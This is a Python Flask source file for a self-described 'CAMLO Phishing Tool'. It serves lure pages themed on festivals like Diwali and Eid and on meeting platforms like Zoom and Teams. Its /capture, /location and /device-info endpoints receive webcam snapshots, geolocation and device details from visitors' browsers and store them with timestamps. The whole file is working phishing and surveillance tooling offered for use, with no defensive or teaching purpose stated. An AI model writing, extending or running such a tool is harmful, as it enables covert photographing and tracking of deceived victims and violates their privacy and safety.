from flask import Flask, request, render_template, jsonify, redirect, url_for
import os
import threading
import webbrowser
from datetime import datetime
import base64
import json
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Configuration
app.config['SECRET_KEY'] = os.urandom(24)
app.config['UPLOAD_FOLDER'] = 'captures'
app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg', 'jpeg', 'gif'}

# Create captures directory if it doesn't exist
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Define festivals and meetings
FESTIVALS = ["holi", "diwali", "eid", "christmas", "new year", "ramzaan"]
MEETINGS = ["zoom", "google meet", "class meet", "teams", "skype"]

@app.route('/')
def home():
    """Home page - redirect to terminal selection"""
    return render_template('base.html', title="CAMLO Phishing Tool", message="Select a festival or meeting platform to begin")

@app.route('/festival/<name>')
def festival(name):
    """Serve festival-specific phishing page"""
    if name.lower() in [f.lower() for f in FESTIVALS]:
        return render_template(f'festivals/{name.lower()}.html')
    return "Festival not found", 404

@app.route('/meeting/<name>')
def meeting(name):
    """Serve meeting platform-specific phishing page"""
    if name.lower() in [m.lower() for m in MEETINGS]:
        return render_template(f'meetings/{name.lower().replace(" ", "-")}.html')
    return "Meeting platform not found", 404

@app.route('/capture', methods=['POST'])
def capture():
    """Handle camera capture submission"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data received'}), 400
        
        # Extract image data
        image_data = data.get('image', '')
        location_data = data.get('location', {})
        device_info = data.get('deviceInfo', {})
        
        # Generate filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"capture_{timestamp}.png"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        # Save image
        if image_data.startswith('data:image'):
            image_data = image_data.split(',')[1]  # Remove data URL prefix
        
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(image_data))
        
        # Save metadata
        metadata = {
            'timestamp': datetime.now().isoformat(),
            'location': location_data,
            'device_info': device_info,
            'filename': filename
        }
        
        metadata_file = filepath.replace('.png', '.json')
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        logger.info(f"Captured image: {filename}")
        return jsonify({'success': True, 'message': 'Capture saved successfully'})
    
    except Exception as e:
        logger.error(f"Error capturing image: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/location', methods=['POST'])
def location():
    """Handle location data submission"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data received'}), 400
        
        # Save location data
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"location_{timestamp}.json"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        
        logger.info(f"Captured location: {filename}")
        return jsonify({'success': True, 'message': 'Location saved successfully'})
    
    except Exception as e:
        logger.error(f"Error saving location: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/device-info', methods=['POST'])
def device_info():
    """Handle device information submission"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data received'}), 400
        
        # Save device info
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"device_{timestamp}.json"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        
        logger.info(f"Captured device info: {filename}")
        return jsonify({'success': True, 'message': 'Device info saved successfully'})
    
    except Exception as e:
        logger.error(f"Error saving device info: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/test')
def test():
    """Test route to verify server is running"""
    return jsonify({
        'status': 'success',
        'message': 'Server is running',
        'timestamp': datetime.now().isoformat()
    })

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(e):
    return render_template('500.html'), 500

def open_browser():
    """Open browser to localhost after server starts"""
    import time
    time.sleep(1)  # Wait for server to start
    webbrowser.open('http://localhost:5000')

if __name__ == '__main__':
    # Start browser in separate thread
    browser_thread = threading.Thread(target=open_browser)
    browser_thread.daemon = True
    browser_thread.start()
    
    # Run Flask app
    app.run(host='0.0.0.0', port=5000, debug=True)
